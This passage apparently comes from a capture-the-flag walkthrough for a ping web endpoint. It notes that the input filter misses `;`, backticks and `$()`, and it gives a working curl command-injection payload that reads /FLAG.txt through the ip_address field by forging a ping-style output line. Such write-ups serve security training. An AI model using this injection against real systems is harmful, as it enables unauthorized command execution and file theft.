blocks only `< > | &`, so `;`, backticks and `$()` still work. Output is parsed
by a regex expecting ping-style lines, so forge a line embedding the flag.

1. **Inject a command** that prints the flag inside a line the parser accepts
   (use an invalid ping host so real ping output is empty):

   ```
   curl -s -X POST "http://<target>/ping" \
     --data-urlencode 'ip_address=asdf; echo "$(cat /FLAG.txt) packets transmitted, 1 received, 0% packet loss"'
   ```

2. **Extract the flag** (`FLAG{...}`) from the reflected "packets transmitted"
   line and report it verbatim.
